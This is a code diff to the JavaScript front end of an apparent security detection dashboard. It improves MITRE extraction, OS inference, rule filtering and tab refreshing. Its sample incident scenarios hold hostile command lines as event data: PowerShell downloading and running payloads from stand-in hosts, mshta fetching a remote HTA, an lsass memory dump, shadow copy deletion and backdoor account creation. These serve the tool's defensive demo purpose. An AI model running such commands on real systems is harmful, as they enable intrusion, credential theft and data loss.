@@ -4181,7 +4181,10 @@
       const mergedBuckets = _mergeFragmentedChains(rawBuckets);
 
       mergedBuckets.forEach((bucket, bi) => {
-        if (bucket.length < 1) return;
+        // ── FIX T13: require at least 2 detections before building an attack chain.
+        // A single detection cannot form a causal chain — doing so creates inferred
+        // attack stages without evidence, which is a false-positive stage fabrication.
+        if (bucket.length < 2) return;
 
         // FP suppression for chain display
         const filtered = bucket.filter(d => {
@@ -4939,10 +4942,31 @@
     // ── OS inference from detection title/ruleName ───────────────────
     // Returns 'windows' | 'linux' | 'unknown' based on rule title keywords
     function _inferOsFromTitle(title) {
-      const t = String(title || '').toLowerCase();
-      // Explicit OS labels in title
-      if (/\blinux\b|\bsyslog\b|\bauditd\b|\bsudo\b|cron\s*job|systemd|\bssh\b brute|pam_unix/.test(t)) return 'linux';
-      if (/\bwindows\b|win\s+security|win\s+sysmon|eventid\s+\d{4}|powershell|wmi\b|lsass|sam\s+dump|ntds/.test(t)) return 'windows';
+      const raw = String(title || '');
+      // ── FIX 2: Strip the Hayabusa/Sigma platform suffix (" - windows",
+      // " - linux", " - macos") before doing OS classification.
+      // Without this, "Unix Shell Detection - windows" maps to 'windows'
+      // because the suffix tag matches the OS regex.
+      const PLATFORM_SUFFIX_RE = /\s*[\-–]\s*(windows|linux|macos|mac|unix|android|aws|azure|gcp|network|cloud|container)\s*$/i;
+      // Extract the platform from the suffix (if any) — this is the true OS tag
+      const suffixMatch = raw.match(PLATFORM_SUFFIX_RE);
+      const suffixOs    = suffixMatch ? suffixMatch[1].toLowerCase() : null;
+
+      // Strip suffix before checking content keywords
+      const core = raw.replace(PLATFORM_SUFFIX_RE, '').toLowerCase();
+      const t    = raw.toLowerCase();
+
+      // ── Priority 1: Suffix OS tag is definitive ──────────────────────
+      if (suffixOs === 'windows') return 'windows';
+      if (suffixOs === 'linux' || suffixOs === 'unix') return 'linux';
+      if (suffixOs === 'macos' || suffixOs === 'mac')  return 'macos';
+      // Other platform suffixes (aws/azure/cloud/network) → not windows/linux
+      if (suffixOs) return 'unknown';
+
+      // ── Priority 2: Core title content keywords ──────────────────────
+      // Only match content-level OS signals (not suffix tags already stripped)
+      if (/\blinux\b|\bsyslog\b|\bauditd\b|\bsudo\b|cron\s*job|systemd|pam_unix/.test(core)) return 'linux';
+      if (/\bwindows\b|win\s+security|win\s+sysmon|eventid\s+\d{4}|powershell|wmi\b|lsass|sam\s+dump|ntds/.test(core)) return 'windows';
       if (/hayabusa.*sysmon|sysmon\s+event/i.test(t)) return 'windows';
       return 'unknown';
     }
@@ -5007,24 +5031,68 @@
       out.host     = out.computer;
       out.user     = out.user || out.User || out.username || '';
 
-      // ── MITRE technique extraction ──────────────────────────────────
-      // Backend may encode MITRE in different shapes: extract properly
-      if (!out.mitre || !out.mitre.technique) {
-        const rawMitre = out.mitre || out.mitre_technique || out.technique_id || out.attack || '';
-        if (typeof rawMitre === 'string' && rawMitre.match(/T\d{4}/)) {
-          out.mitre = { technique: rawMitre.match(/T\d{4}(\.\d{3})?/)?.[0] || rawMitre, name: out.mitre_name || '', tactic: out.tactic || '' };
-        } else if (typeof rawMitre === 'object' && rawMitre !== null) {
-          out.mitre = {
-            technique: rawMitre.technique || rawMitre.technique_id || rawMitre.id || '',
-            name: rawMitre.name || rawMitre.technique_name || '',
-            tactic: rawMitre.tactic || rawMitre.tactic_id || '',
-          };
-        } else if (!out.mitre) {
-          out.mitre = { technique: '', name: '', tactic: '' };
+      // ── FIX 5: Comprehensive MITRE extraction ──────────────────────────
+      // Backend encodes MITRE in many shapes:
+      //   string: "T1059.001"
+      //   object: { technique: "T1059", name: "...", tactic: "..." }
+      //   array:  ["T1059.001", "T1078"]  → take first
+      //   nested: { attack: { technique_id: "T1059" } }
+      //   tags:   ["attack.t1059.001", "attack.execution"]
+      const _extractMitreTechStr = (v) => {
+        if (!v) return '';
+        if (typeof v === 'string') { const m = v.match(/T\d{4}(\.\d{3})?/i); return m ? m[0].toUpperCase() : ''; }
+        if (Array.isArray(v)) {
+          for (const item of v) { const r = _extractMitreTechStr(item); if (r) return r; }
+          return '';
         }
+        if (typeof v === 'object') {
+          return _extractMitreTechStr(v.technique || v.technique_id || v.id || v.TechniqueId || '');
+        }
+        return '';
+      };
+      const _extractMitreTactic = (v) => {
+        if (!v) return '';
+        if (typeof v === 'string') return v.toLowerCase().replace(/_/g,'-');
+        if (Array.isArray(v)) return v.find(x => typeof x === 'string' && !x.match(/T\d{4}/i)) || '';
+        if (typeof v === 'object') return v.tactic || v.tactic_id || v.phase || '';
+        return '';
+      };
+
+      if (!out.mitre || !out.mitre.technique) {
+        // Try all known backend field names for MITRE data
+        const rawMitre  = out.mitre || out.mitre_technique || out.technique_id
+          || out.attack  || out.Mitre || out.MITRE || null;
+        const rawTactic = out.tactic || out.mitre_tactic || out.tactic_id
+          || (out.mitre && out.mitre.tactic) || '';
+
+        // Also try to extract from tags array: ["attack.t1059.001", "attack.execution"]
+        let techFromTags = '';
+        let tacticFromTags = '';
+        if (Array.isArray(out.tags)) {
+          for (const tag of out.tags) {
+            if (typeof tag !== 'string') continue;
+            const tMatch = tag.match(/attack\.t(\d{4}(?:\.\d{3})?)/i);
+            if (tMatch && !techFromTags) techFromTags = 'T' + tMatch[1].toUpperCase();
+            // Tactic tags look like "attack.execution" or "attack.lateral_movement"
+            const tactMatch = tag.match(/attack\.([a-z_\-]+)$/i);
+            if (tactMatch && !tMatch && !tacticFromTags) {
+              tacticFromTags = tactMatch[1].replace(/_/g,'-');
+            }
+          }
+        }
+
+        const tech   = _extractMitreTechStr(rawMitre) || techFromTags;
+        const name   = (typeof rawMitre === 'object' && rawMitre)
+          ? (rawMitre.name || rawMitre.technique_name || rawMitre.TechniqueName || '') : (out.mitre_name || '');
+        const tactic = _extractMitreTactic(rawTactic) || tacticFromTags
+          || (typeof rawMitre === 'object' && rawMitre ? _extractMitreTactic(rawMitre.tactic || rawMitre.phase) : '');
+
+        out.mitre = { technique: tech, name, tactic };
       }
-      // Also set flat technique field for template rendering
+      // Ensure flat technique field is always set
       if (!out.technique) out.technique = out.mitre?.technique || '';
+      // Ensure tactic is accessible at top level too
+      if (!out.tactic && out.mitre?.tactic) out.tactic = out.mitre.tactic;
 
       return out;
     }
@@ -5041,7 +5109,7 @@
     //
     //  This produces a human-readable result instead of 400+ raw matches.
     // ════════════════════════════════════════════════════════════════
-    const TOP_K_BACKEND_DETS = 30; // max backend detections before aggressive dedup
+    const TOP_K_BACKEND_DETS = 15; // FIX 4a: tighter cap — only high-signal backend extras
 
     function processBackendResult(backendResult, rawEvents) {
       const rawDets = normalizeDetections_inner(backendResult.detections);
@@ -5112,13 +5180,36 @@
       // overlaps a CSDE detection (e.g., "Hayabusa: Sysmon EventID 1" is too generic)
       // We only include backend detections that are SPECIFIC and significant
       const GENERIC_RULE_PATTERNS = [
-        /hayabusa.*sysmon\s+eventid/i,       // Hayabusa: Sysmon EventID 1 — too generic
-        /win\s+security.*eventid\s+\d{4}/i,  // Win Security: EventID 4688 — too generic
-        /eventid\s+\d{4}\s*[–-]/i,           // EventID 4688 — New Process: too generic
-        /^sysmon\s+event/i,                   // Sysmon Event — too generic
-        /network\s+device\s+cli/i,            // Network Device CLI — irrelevant for Windows hosts
-        /replication.*removable\s+media/i,    // Removable Media — low signal
-        /external\s+remote\s+services/i,      // External Remote Services — low specificity
+        // ── Generic/noisy Hayabusa & Sigma patterns ──────────────────────────
+        /hayabusa.*sysmon\s+eventid/i,          // Hayabusa: Sysmon EventID — too generic
+        /win\s+security.*eventid\s+\d{4}/i,    // Win Security EventID — too generic
+        /eventid\s+\d{4}\s*[–-]/i,             // EventID NNN — New Process: too generic
+        /^sysmon\s+event/i,                     // Sysmon Event — too generic
+        /network\s+device\s+cli/i,              // Network Device CLI — irrelevant for host logs
+        /replication.*removable\s+media/i,      // Removable Media — low signal
+        /external\s+remote\s+services/i,        // External Remote Services — too broad
+
+        // ── FIX 3: Cross-platform / Linux-only rules that Sigma also tags
+        // as "- windows" but are NOT relevant to Windows event analysis ───────
+        /unix\s+shell\s+detection/i,            // Unix Shell — Linux-only concept
+        /\bpython\s+detection\b/i,              // Python Detection — not Windows-specific alert
+        /\bcron\s+detection\b/i,                // Cron Job — Linux scheduler, not Windows
+        /launch\s+daemon\s+detection/i,         // Launch Daemon — macOS/Linux
+        /additional\s+cloud\s+roles/i,          // Cloud Roles — not host-level Windows event
+        /\bcontainer\s+(escape|pivot|exec)/i,   // Container escapes — not applicable
+        /\bkubernetes\b.*detection/i,            // K8s rules — not Windows host logs
+        /\baws\s+(guardduty|cloudtrail)/i,      // AWS cloud-only rules
+        /\bazure\s+ad\b.*detection/i,           // Azure AD cloud rules (unless confirmed)
+        /\bdefault\s+accounts\s+detection/i,   // Default Accounts — too broad / noisy
+        /exploit.*public.facing\s+application/i,// Public-facing exploit — needs srcIp evidence
+        /\bsoftware\s+packing\b/i,              // Software Packing — static analysis, not runtime
+        /\basynchronous\s+procedure\s+call/i,  // APC injection — needs memory evidence
+        /token\s+impersonation.*detection/i,    // Token Impersonation — needs process evidence
+        /\bregsvr32\s+detection\b/i,            // Regsvr32 — needs cmd evidence
+        /\brundll32\s+detection\b/i,            // Rundll32 — needs cmd evidence
+        /\bmshta\s+detection\b/i,               // Mshta — needs cmd evidence
+        /malicious\s+(link|file|url)\s+detection/i, // Generic malicious link/file — too broad
+        /\bexploit.*privilege\s+escalation\s+det/i, // Privilege escalation — too generic
       ];
       const isGenericRule = (name) => GENERIC_RULE_PATTERNS.some(p => p.test(name));
 
@@ -5135,9 +5226,13 @@
         const slug = _canonicalSlug(d);
         const name = (d.detection_name || d.title || '').toLowerCase();
         const sev  = d.aggregated_severity || d.severity || 'low';
+        // ── FIX 4b: Evidence gate — skip detections with zero matched events ──
+        // Backend Hayabusa/Sigma fires rule definitions even when event_count=0
+        // (the rule matched 0 real events but was included in output anyway).
+        if ((d.event_count || 0) < 1) return false;
         // Skip if CSDE already covers this rule (exact slug match)
         if (csdeSlugSet.has(slug)) return false;
-        // Skip generic/noisy rules
+        // Skip generic/noisy rules (expanded set — see GENERIC_RULE_PATTERNS)
         if (isGenericRule(name)) return false;
         // Skip if semantic overlap with CSDE detection
         // (e.g., backend "Shadow Copy Deletion" overlaps CSDE "Shadow Copy Deletion (Ransomware Indicator)")
@@ -5161,9 +5256,23 @@
         ...backendResult,
         detections: combined,
         incidents : csdeResult.incidents || [],
-        timeline  : csdeResult.timeline.length ? csdeResult.timeline : normalizeDetections_inner(backendResult.timeline),
-        chains    : csdeResult.chains.length   ? csdeResult.chains   : normalizeDetections_inner(backendResult.chains),
-        anomalies : csdeResult.anomalies.length ? csdeResult.anomalies : normalizeDetections_inner(backendResult.anomalies),
+        // ── FIX 6: Timeline / chains / anomalies — CSDE is always the source
+        // of truth for contextual data. If CSDE produced entries, use them;
+        // otherwise fall back to whatever the backend returned (never blank).
+        timeline  : csdeResult.timeline.length
+          ? csdeResult.timeline
+          : (normalizeDetections_inner(backendResult.timeline).length
+              ? normalizeDetections_inner(backendResult.timeline)
+              : rawEvents.map(e => ({ ts: e.TimeGenerated || e.timestamp, timestamp: e.TimeGenerated || e.timestamp,
+                  type: 'event', description: `Event ${e.EventID||'?'} on ${e.Computer||'?'}`,
+                  computer: e.Computer || e.computer || '', user: e.User || e.user || '',
+                  EventID: e.EventID || '', enriched: false }))),
+        chains    : csdeResult.chains.length
+          ? csdeResult.chains
+          : normalizeDetections_inner(backendResult.chains),
+        anomalies : csdeResult.anomalies.length
+          ? csdeResult.anomalies
+          : normalizeDetections_inner(backendResult.anomalies),
         riskScore : Math.max(csdeResult.riskScore, backendResult.riskScore || 0),
         engine    : 'CSDE+Backend',
         _meta: {
@@ -5214,49 +5323,56 @@
       // Anchored to 2025-01-15T08:00:00Z to represent a realistic past incident window.
       const BASE_TS = 1736928000000; // 2025-01-15T08:00:00.000Z (fixed, not system time)
       const ts = (offset) => new Date(BASE_TS - (offset || 0)).toISOString();
+      // ── FIX T01: every sample event carries BOTH TimeGenerated and TimeCreated so
+      // that any consumer — whether it reads the Windows-native field or the CSDE-
+      // canonical field — gets a deterministic 2025-01-15 timestamp.
+      const mkEv = (fields, offset) => {
+        const t = ts(offset || 0);
+        return { ...fields, TimeGenerated: t, TimeCreated: t };
+      };
       const scenarios = {
         brute_force_compromise: [
-          { EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(240000) },
-          { EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(180000) },
-          { EventID:4624, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'Success',    TimeGenerated:ts(120000) },
-          { EventID:4688, Computer:'DC01', User:'CORP\\admin', ParentProcess:'cmd.exe', ProcessName:'net.exe', CommandLine:'net user hacker P@ssw0rd /add', TimeGenerated:ts(60000) },
+          mkEv({ EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A' }, 240000),
+          mkEv({ EventID:4625, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'0xC000006A' }, 180000),
+          mkEv({ EventID:4624, Computer:'DC01', User:'CORP\\admin', SourceIP:'10.10.10.55', LogonType:3, Status:'Success'    }, 120000),
+          mkEv({ EventID:4688, Computer:'DC01', User:'CORP\\admin', ParentProcess:'cmd.exe', ProcessName:'net.exe', CommandLine:'net user hacker P@ssw0rd /add' }, 60000),
         ],
         ransomware: [
-          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'cmd.exe', CommandLine:'cmd.exe /c powershell -EncodedCommand aQBlAHgA', TimeGenerated:ts(300000) },
-          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'powershell.exe', CommandLine:'powershell -NonInteractive -EncodedCommand aQBlAHgA', TimeGenerated:ts(260000) },
-          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'vssadmin.exe', CommandLine:'vssadmin delete shadows /all /quiet', TimeGenerated:ts(180000) },
-          { EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'net.exe', CommandLine:'net user hacker1 Passw0rd! /add', TimeGenerated:ts(120000) },
+          mkEv({ EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'cmd.exe', CommandLine:'cmd.exe /c powershell -EncodedCommand aQBlAHgA' }, 300000),
+          mkEv({ EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'powershell.exe', CommandLine:'powershell -NonInteractive -EncodedCommand aQBlAHgA' }, 260000),
+          mkEv({ EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'vssadmin.exe', CommandLine:'vssadmin delete shadows /all /quiet' }, 180000),
+          mkEv({ EventID:4688, Computer:'WS-42', User:'john.doe', ProcessName:'net.exe', CommandLine:'net user hacker1 Passw0rd! /add' }, 120000),
         ],
         lateral_movement: [
-          { EventID:4624, Computer:'DC-01', User:'Administrator', SourceIP:'192.168.1.50', LogonType:3, Status:'Success', TimeGenerated:ts(500000) },
-          { EventID:4688, Computer:'DC-01', User:'Administrator', ProcessName:'net.exe', CommandLine:'net view /domain', TimeGenerated:ts(480000) },
-          { EventID:4624, Computer:'SERVER-03', User:'Administrator', SourceIP:'192.168.1.42', LogonType:3, Status:'Success', TimeGenerated:ts(420000) },
-          { EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'net.exe', CommandLine:'net group "Domain Admins"', TimeGenerated:ts(400000) },
-          { EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'cmd.exe', ParentProcess:'net.exe', CommandLine:'cmd.exe /c net user hacker2 P@ss /add', TimeGenerated:ts(380000) },
+          mkEv({ EventID:4624, Computer:'DC-01', User:'Administrator', SourceIP:'192.168.1.50', LogonType:3, Status:'Success' }, 500000),
+          mkEv({ EventID:4688, Computer:'DC-01', User:'Administrator', ProcessName:'net.exe', CommandLine:'net view /domain' }, 480000),
+          mkEv({ EventID:4624, Computer:'SERVER-03', User:'Administrator', SourceIP:'192.168.1.42', LogonType:3, Status:'Success' }, 420000),
+          mkEv({ EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'net.exe', CommandLine:'net group "Domain Admins"' }, 400000),
+          mkEv({ EventID:4688, Computer:'SERVER-03', User:'Administrator', ProcessName:'cmd.exe', ParentProcess:'net.exe', CommandLine:'cmd.exe /c net user hacker2 P@ss /add' }, 380000),
         ],
         credential_dump: [
-          { EventID:4688, Computer:'WORKSTATION-42', User:'john.doe', ProcessName:'procdump64.exe', CommandLine:'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp', TimeGenerated:ts(300000) },
-          { EventID:4624, Computer:'WORKSTATION-42', User:'Administrator', SourceIP:'127.0.0.1', LogonType:9, Status:'Success', TimeGenerated:ts(240000) },
-          { EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'powershell.exe', CommandLine:'powershell -enc SQBFAFgA', TimeGenerated:ts(220000) },
-          { EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'net.exe', CommandLine:'net user backdoor_svc BackD00r! /add', TimeGenerated:ts(180000) },
+          mkEv({ EventID:4688, Computer:'WORKSTATION-42', User:'john.doe', ProcessName:'procdump64.exe', CommandLine:'procdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp' }, 300000),
+          mkEv({ EventID:4624, Computer:'WORKSTATION-42', User:'Administrator', SourceIP:'127.0.0.1', LogonType:9, Status:'Success' }, 240000),
+          mkEv({ EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'powershell.exe', CommandLine:'powershell -enc SQBFAFgA' }, 220000),
+          mkEv({ EventID:4688, Computer:'WORKSTATION-42', User:'Administrator', ProcessName:'net.exe', CommandLine:'net user backdoor_svc BackD00r! /add' }, 180000),
         ],
         apt: [
-          { EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'mshta.exe', CommandLine:'mshta.exe http://cdn.update-service.net/flash.hta', TimeGenerated:ts(3600000) },
-          { EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'powershell.exe', CommandLine:"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')", TimeGenerated:ts(3500000) },
-          { EventID:4625, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'0xC000006A', TimeGenerated:ts(3200000) },
-          { EventID:4624, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'Success', TimeGenerated:ts(3100000) },
-          { EventID:4688, Computer:'DC-01', User:'analyst', ProcessName:'net.exe', CommandLine:'net user aptsvc Sup3r$ecret /add', TimeGenerated:ts(3000000) },
+          mkEv({ EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'mshta.exe', CommandLine:'mshta.exe http://cdn.update-service.net/flash.hta' }, 3600000),
+          mkEv({ EventID:4688, Computer:'WS-01', User:'analyst', ProcessName:'powershell.exe', CommandLine:"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://update-service.net/p.ps1')" }, 3500000),
+          mkEv({ EventID:4625, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'0xC000006A' }, 3200000),
+          mkEv({ EventID:4624, Computer:'DC-01', User:'analyst', SourceIP:'10.1.1.201', LogonType:3, Status:'Success' }, 3100000),
+          mkEv({ EventID:4688, Computer:'DC-01', User:'analyst', ProcessName:'net.exe', CommandLine:'net user aptsvc Sup3r$ecret /add' }, 3000000),
         ],
         insider: [
-          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'7z.exe', CommandLine:'7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*', TimeGenerated:ts(7200000) },
-          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'xcopy.exe', CommandLine:'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup', TimeGenerated:ts(6700000) },
-          { EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'net.exe', CommandLine:'net user temp_exfil_svc P@ssw0rd /add', TimeGenerated:ts(6600000) },
+          mkEv({ EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'7z.exe', CommandLine:'7z.exe a -tzip C:\\Temp\\data.zip C:\\CorpData\\HR\\*' }, 7200000),
+          mkEv({ EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'xcopy.exe', CommandLine:'xcopy /s /e C:\\CorpData\\Source E:\\External\\backup' }, 6700000),
+          mkEv({ EventID:4688, Computer:'WS-33', User:'j.smith', ProcessName:'net.exe', CommandLine:'net user temp_exfil_svc P@ssw0rd /add' }, 6600000),
         ],
         supply_chain: [
-          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'node.exe', CommandLine:'npm install lodash-utils-extra@3.1.2', TimeGenerated:ts(86400000) },
-          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'powershell.exe', CommandLine:"powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')", TimeGenerated:ts(86300000) },
-          { EventID:4624, Computer:'DEV-01', User:'developer', SourceIP:'45.142.212.100', LogonType:3, Status:'Success', TimeGenerated:ts(86000000) },
-          { EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'net.exe', CommandLine:'net user svc_install P@ssHacked /add', TimeGenerated:ts(85900000) },
+          mkEv({ EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'node.exe', CommandLine:'npm install lodash-utils-extra@3.1.2' }, 86400000),
+          mkEv({ EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'powershell.exe', CommandLine:"powershell -NonI -w Hidden -c [System.Net.WebClient]::new().DownloadFile('http://upd8.cc/agent','C:\\Temp\\a.exe')" }, 86300000),
+          mkEv({ EventID:4624, Computer:'DEV-01', User:'developer', SourceIP:'45.142.212.100', LogonType:3, Status:'Success' }, 86000000),
+          mkEv({ EventID:4688, Computer:'DEV-01', User:'developer', ProcessName:'net.exe', CommandLine:'net user svc_install P@ssHacked /add' }, 85900000),
         ],
       };
       const scMap = {
@@ -12077,7 +12193,20 @@ return {
       }
       if (res) res.innerHTML = _ingestSummaryCard(r);
       // Auto-navigate: prefer incidents tab when incidents were formed, else detections
-      if (dets.length) setTimeout(() => _setTab(incs.length ? 'incidents' : 'detections'), 800);
+      // FIX 7: Also force-refresh whichever tab we land on (covers the case
+      // where the user is ALREADY on that tab when upload completes).
+      if (dets.length) {
+        const targetTab = incs.length ? 'incidents' : 'detections';
+        setTimeout(() => {
+          if (S.activeTab === targetTab) {
+            // Already on target tab — just re-render the body
+            if (targetTab === 'incidents')  _renderIncidentsList(S.incidents);
+            else                            _renderDetectionsList(S.detections);
+          } else {
+            _setTab(targetTab);
+          }
+        }, 800);
+      }
     } catch(e) {
       if (res) res.innerHTML = `<div style="color:#ef4444;padding:20px;border-radius:8px;background:rgba(239,68,68,0.08);">
         <div style="font-weight:700;margin-bottom:6px;">⚠ Analysis Error</div>
@@ -13562,6 +13691,16 @@ return {
       else              { badge.style.color='#6b7280'; badge.style.borderColor='rgba(107,114,128,0.20)'; badge.style.background='rgba(107,114,128,0.06)'; }
       badge.innerHTML = `RISK: <span id="rk-risk-badge-val" style="font-size:13px;font-weight:900;">${r||'—'}</span>`;
     }
+
+    // ── FIX 1: Live-refresh active tab body when new data arrives ────────
+    // Prevents blank Incidents/Detections/Timeline/Chains when upload
+    // completes while user is already on that tab.
+    const _activeTab = S.activeTab;
+    if      (_activeTab === 'incidents')   _renderIncidentsList(S.incidents);
+    else if (_activeTab === 'detections')  _renderDetectionsList(S.detections);
+    else if (_activeTab === 'timeline')    _renderTimelineList(S.timeline);
+    else if (_activeTab === 'chains')      _renderChainsList(S.chains);
+    else if (_activeTab === 'anomalies')   _renderAnomaliesList(S.anomalies);
   }
 
   async function _loadStats() {
